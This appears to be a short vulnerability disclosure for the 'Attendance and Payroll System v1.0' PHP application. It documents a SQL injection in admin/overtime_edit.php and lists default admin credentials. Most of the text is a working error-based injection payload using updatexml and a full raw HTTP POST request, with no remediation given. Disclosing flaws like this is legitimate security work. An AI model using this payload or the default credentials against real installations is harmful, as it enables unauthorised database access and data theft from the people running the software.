# Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\overtime_edit.php has SQL injection

Payload: id=5' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&date=1907-05-08&hours=11&mins=NaN&rate=10&edit=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159261630-83b0d277-7fad-4c21-852c-a218c9f33c0c.png)

```sql
POST /apsystem/admin/overtime_edit.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 113
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/overtime.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=5' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&date=1907-05-08&hours=11&mins=NaN&rate=10&edit=
```
![image](https://user-images.githubusercontent.com/54017627/159261876-a0408fa2-6430-4f24-8016-1267dd24f513.png)

![image](https://user-images.githubusercontent.com/54017627/159261792-89bd5001-ae70-4f45-9cb6-5ed67153a3a7.png)
